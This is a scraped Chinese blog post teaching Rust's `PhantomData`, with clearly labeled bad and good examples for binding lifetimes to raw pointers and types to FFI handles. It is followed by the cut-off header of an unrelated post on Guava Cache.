`PhantomData`：零成本把“语义信息”交给编译器"/> <meta itemprop="keywords" content="Rust"/> <meta itemprop="datePublished" content="2026-01-05T15:31:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Pomelo_刘金"/> <meta itemprop="url" content="https://juejin.cn/user/3450694359320669"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Rust 的 `PhantomData`：零成本把“语义信息”交给编译器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3450694359320669/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Pomelo_刘金
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-05T15:31:03.000Z" title="Mon Jan 05 2026 15:31:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在写底层 Rust（尤其是 <strong>unsafe / 裸指针 / FFI</strong>）时，你会遇到一种常见矛盾：</p>
<ul>
<li><strong>运行时</strong>：你手里可能只有一个 <code>*const T</code> / <code>*mut T</code> / <code>*mut c_void</code>（比如外部库返回的句柄），结构体里并没有真正存放某个引用或某个类型的值。</li>
<li><strong>编译期</strong>：你又希望编译器知道“我这个类型<strong>和某个生命周期/类型绑定</strong>”，从而帮你做借用检查、推导 <code>Send/Sync</code>、避免错误混用等。</li>
</ul>
<p><code>std::marker::PhantomData&lt;T&gt;</code> 就是为了解决这个问题而存在的工具。官方文档的核心定义是：</p>
<blockquote>
<p><code>PhantomData&lt;T&gt;</code> 是一个 <strong>零大小类型</strong>（ZST），用于标记你的类型“<strong>行为上像是拥有/包含</strong> 一个 <code>T</code>”，尽管你实际上并没有存储 <code>T</code>。这会影响编译器计算一些安全相关属性。</p>
</blockquote>
<p>也因此，它常被称为“<strong>只在编译期生效的零成本抽象</strong>”。</p>
<ul>
<li><code>size_of::&lt;PhantomData&lt;T&gt;&gt;() == 0</code></li>
<li><code>align_of::&lt;PhantomData&lt;T&gt;&gt;() == 1</code></li>
</ul>
<p>下面用两个最典型的场景来科普：</p>
<ol>
<li><strong>绑定生命周期（防悬垂）</strong></li>
<li><strong>绑定类型参数（防混用）</strong></li>
</ol>
<hr/>
<h2 data-id="heading-0">1. 绑定生命周期：裸指针不带生命周期，需要用 <code>PhantomData&lt;&amp;'a T&gt;</code> 把借用关系“说清楚”</h2>
<p>假设你想实现一个 slice/数组的迭代器或视图，内部用裸指针表示范围：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slice</span>&lt;T&gt; {
    start: *<span class="hljs-keyword">const</span> T,
    end: *<span class="hljs-keyword">const</span> T,
}
</code></pre>
<p>如果这些指针来自某个外部数据（比如 <code>Vec&lt;T&gt;</code> / <code>&amp;[T]</code>），为了避免悬垂指针，你的真实意图是：</p>
<blockquote>
<p><code>Slice</code> <strong>不能活得比原始数据更久</strong></p>
</blockquote>
<p>但问题是：<code>*const T</code> <strong>不携带生命周期</strong>，编译器无法从字段中推导“它借用了谁、借用了多久”。于是你会想加生命周期参数：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slice</span>&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    start: *<span class="hljs-keyword">const</span> T,
    end: *<span class="hljs-keyword">const</span> T,
}
</code></pre>
<p>这会立刻遇到编译器抱怨：<code>'a</code> 没有被使用（unused lifetime parameter）。更重要的是：即使你强行让它通过，编译器也仍然不知道 <code>'a</code> 和哪些数据有关。</p>
<h3 data-id="heading-1">正确写法：加一个“假装持有引用”的标记字段</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::marker::PhantomData;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Slice</span>&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    start: *<span class="hljs-keyword">const</span> T,
    end: *<span class="hljs-keyword">const</span> T,
    _marker: PhantomData&lt;&amp;<span class="hljs-symbol">'a</span> T&gt;,
}
</code></pre>
<p><code>PhantomData&lt;&amp;'a T&gt;</code> 的含义可以直译为：</p>
<blockquote>
<p>“请把我当成<strong>好像</strong>内部存了一个 <code>&amp;'a T</code> 引用。”</p>
</blockquote>
<p>于是类型系统就会把 <code>Slice&lt;'a, T&gt;</code> 当成“借用了 <code>'a</code> 的 <code>T</code>”，从而强制它不能活过 <code>'a</code>。</p>
<hr/>
<h3 data-id="heading-2">坏例子：没有生命周期绑定，能编译，但可能产生悬垂指针（UB）</h3>
<p>下面这段代码演示了“裸指针 + 没有 <code>'a</code>”的危险：它能把指向局部 <code>Vec</code> 的指针带出函数。</p>
<blockquote>
<p>注意：这段代码<strong>可能触发未定义行为（UB）</strong> ，请不要在真实项目里这么写。</p>
</blockquote>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SliceIterBad</span>&lt;T&gt; {
    ptr: *<span class="hljs-keyword">const</span> T,
    len: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">raw_from_vec_bad</span>&lt;T&gt;(v: &amp;<span class="hljs-type">Vec</span>&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> SliceIterBad&lt;T&gt; {
    SliceIterBad {
        ptr: v.<span class="hljs-title function_ invoke__">as_ptr</span>(),
        len: v.<span class="hljs-title function_ invoke__">len</span>(),
    }
}

<span class="hljs-comment">// ❌ 能编译，但返回的 ptr 指向已释放的内存</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">bad</span>() <span class="hljs-punctuation">-&gt;</span> SliceIterBad&lt;<span class="hljs-type">i32</span>&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
    <span class="hljs-title function_ invoke__">raw_from_vec_bad</span>(&amp;v) <span class="hljs-comment">// v 在这里被 drop，但指针被带出去了</span>
}
</code></pre>
<p>这就是典型的“类型系统没被告知借用关系 → 编译器无法阻止悬垂”。</p>
<hr/>
<h3 data-id="heading-3">好例子：用 <code>PhantomData&lt;&amp;'a T&gt;</code> 绑定借用，错误在编译期暴露</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::marker::PhantomData;

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">SliceIter</span>&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    ptr: *<span class="hljs-keyword">const</span> T,
    len: <span class="hljs-type">usize</span>,
    _marker: PhantomData&lt;&amp;<span class="hljs-symbol">'a</span> T&gt;,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">raw_from_vec</span>&lt;<span class="hljs-symbol">'a</span>, T&gt;(v: &amp;<span class="hljs-symbol">'a</span> <span class="hljs-type">Vec</span>&lt;T&gt;) <span class="hljs-punctuation">-&gt;</span> SliceIter&lt;<span class="hljs-symbol">'a</span>, T&gt; {
    SliceIter {
        ptr: v.<span class="hljs-title function_ invoke__">as_ptr</span>(),
        len: v.<span class="hljs-title function_ invoke__">len</span>(),
        _marker: PhantomData,
    }
}

<span class="hljs-comment">// ❌ 这次会直接编译失败：你试图返回一个借用了局部变量 v 的值</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">good_but_wont_compile</span>() <span class="hljs-punctuation">-&gt;</span> SliceIter&lt;<span class="hljs-symbol">'static</span>, <span class="hljs-type">i32</span>&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
    <span class="hljs-title function_ invoke__">raw_from_vec</span>(&amp;v)
}
</code></pre>
<p>你会得到类似这样的错误（不同版本文案略有差异）：</p>
<pre><code class="hljs language-sql" lang="sql">error[E0515]: cannot <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">referencing</span> <span class="hljs-keyword">local</span> variable `v`
  <span class="hljs-keyword">returns</span> a <span class="hljs-keyword">value</span> <span class="hljs-keyword">referencing</span> data owned <span class="hljs-keyword">by</span> the <span class="hljs-keyword">current</span> <span class="hljs-keyword">function</span>
</code></pre>
<p>这就达到了目的：<strong>把潜在的悬垂指针风险提前变成编译错误</strong>。</p>
<p>正确使用方式是：让迭代器不超过数据的作用域，例如：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">ok_usage</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">it</span> = <span class="hljs-title function_ invoke__">raw_from_vec</span>(&amp;v);
    <span class="hljs-comment">// 在 v 的生命周期内使用 it</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">_</span> = it.len;
}
</code></pre>
<hr/>
<h2 data-id="heading-4">2. 绑定类型参数：FFI 句柄是 <code>*mut ()</code>，用 <code>PhantomData&lt;R&gt;</code> 防止把 A 当 B 用</h2>
<p>另一类常见场景来自 FFI：外部库可能用统一的 <code>void*</code>（Rust 里常见 <code>*mut ()</code> 或 <code>*mut c_void</code>）当作“资源句柄”。运行时只有一个指针，但它背后可能对应不同资源类型。</p>
<p>如果你只写成“无类型句柄包装”，编译器分不清“这是 Foo 资源还是 Bar 资源”，于是非常容易混用。</p>
<h3 data-id="heading-5">坏例子：句柄不带类型信息，混用能编译，运行时才爆炸</h3>
<p>下面用 <code>assert!</code> 模拟“用错句柄就炸”（真实 FFI 里可能是崩溃/数据错乱/UB）：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ffi::c_void;

<span class="hljs-keyword">mod</span> foreign_lib {
    <span class="hljs-keyword">use</span> super::c_void;

    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Raw</span> {
        tag: <span class="hljs-type">u32</span>, <span class="hljs-comment">// 1 =&gt; Foo, 2 =&gt; Bar</span>
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(tag: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> *<span class="hljs-keyword">mut</span> c_void {
        <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">into_raw</span>(<span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(Raw { tag })) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> c_void
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_foo</span>(handle: *<span class="hljs-keyword">mut</span> c_void) {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw</span> = handle <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> Raw;
        <span class="hljs-built_in">assert!</span>((*raw).tag == <span class="hljs-number">1</span>, <span class="hljs-string">"expected Foo handle, got tag={}"</span>, (*raw).tag);
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_bar</span>(handle: *<span class="hljs-keyword">mut</span> c_void) {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">raw</span> = handle <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> Raw;
        <span class="hljs-built_in">assert!</span>((*raw).tag == <span class="hljs-number">2</span>, <span class="hljs-string">"expected Bar handle, got tag={}"</span>, (*raw).tag);
    }

    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">free</span>(handle: *<span class="hljs-keyword">mut</span> c_void) {
        <span class="hljs-title function_ invoke__">drop</span>(<span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">from_raw</span>(handle <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> Raw));
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ExternalResourceBad</span> {
    handle: *<span class="hljs-keyword">mut</span> c_void,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ExternalResourceBad</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new_foo</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> { handle: <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">1</span>) } }
    }
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new_bar</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> { handle: <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">2</span>) } }
    }

    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_foo</span>(&amp;<span class="hljs-keyword">self</span>) { <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">do_foo</span>(<span class="hljs-keyword">self</span>.handle) } }
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">do_bar</span>(&amp;<span class="hljs-keyword">self</span>) { <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">do_bar</span>(<span class="hljs-keyword">self</span>.handle) } }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Drop</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ExternalResourceBad</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">drop</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">free</span>(<span class="hljs-keyword">self</span>.handle) }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span> = ExternalResourceBad::<span class="hljs-title function_ invoke__">new_bar</span>();

    <span class="hljs-comment">// ❌ 逻辑错误：拿 Bar 的句柄去当 Foo 用</span>
    <span class="hljs-comment">// 编译器看不出来（类型都一样），但运行时可能 panic/崩溃</span>
    r.<span class="hljs-title function_ invoke__">do_foo</span>();
}
</code></pre>
<h3 data-id="heading-6">好例子：用 <code>PhantomData&lt;R&gt;</code> 把句柄“绑定到类型”，混用直接编译错误</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::{ffi::c_void, marker::PhantomData};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Foo</span>;
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Bar</span>;

<span class="hljs-keyword">trait</span> <span class="hljs-title class_">ResType</span> { <span class="hljs-keyword">const</span> TAG: <span class="hljs-type">u32</span>; }
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ResType</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Foo</span> { <span class="hljs-keyword">const</span> TAG: <span class="hljs-type">u32</span> = <span class="hljs-number">1</span>; }
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">ResType</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Bar</span> { <span class="hljs-keyword">const</span> TAG: <span class="hljs-type">u32</span> = <span class="hljs-number">2</span>; }

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ExternalResource</span>&lt;R&gt; {
    handle: *<span class="hljs-keyword">mut</span> c_void,
    _<span class="hljs-keyword">type</span>: PhantomData&lt;R&gt;,
}

<span class="hljs-keyword">impl</span>&lt;R: ResType&gt; ExternalResource&lt;R&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">Self</span> {
            handle: <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">new</span>(R::TAG) },
            _<span class="hljs-keyword">type</span>: PhantomData,
        }
    }
}

<span class="hljs-keyword">impl</span>&lt;R&gt; <span class="hljs-built_in">Drop</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">ExternalResource</span>&lt;R&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">drop</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) {
        <span class="hljs-keyword">unsafe</span> { foreign_lib::<span class="hljs-title function_ invoke__">free</span>(<span class="hljs-keyword">self</span>.handle) }
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">takes_foo</span>(_: ExternalResource&lt;Foo&gt;) {}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">foo</span> = ExternalResource::&lt;Foo&gt;::<span class="hljs-title function_ invoke__">new</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">bar</span> = ExternalResource::&lt;Bar&gt;::<span class="hljs-title function_ invoke__">new</span>();

    <span class="hljs-title function_ invoke__">takes_foo</span>(foo); <span class="hljs-comment">// ✅ OK</span>

    <span class="hljs-comment">// takes_foo(bar);</span>
    <span class="hljs-comment">// ❌ 编译期报错：</span>
    <span class="hljs-comment">// expected `ExternalResource&lt;Foo&gt;`, found `ExternalResource&lt;Bar&gt;`</span>
}
</code></pre>
<p>这就是文档里“未使用类型参数”的核心意义：哪怕结构体里<strong>根本没有存 <code>R</code></strong>，你仍然可以用 <code>PhantomData&lt;R&gt;</code> 让类型系统记住并区分它，从而把很多“本来只能靠人肉保证的约定”变成<strong>编译器可检查的约束</strong>。
from Pomelo_刘金，转载请注明原文链接。感谢！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入解析 Guava Cache- 从基本用法、回收策略、刷新策略到实现原理]]></title>    <link>https://juejin.cn/post/7592017365146075176</link>    <guid>https://juejin.cn/post/7592017365146075176</guid>    <pubDate>2026-01-06T06:44:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592017365146075176" data-draft-id="7592017365146042408" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入解析 Guava Cache- 从基本用法、回收策略、刷新策略到实现原理"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T06:44:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入解析 Guava Cache- 从基本用法、回收策略、刷新策略到实现原理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T06:44:58.000Z" title="Tue Jan 06 2026 06:44:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body 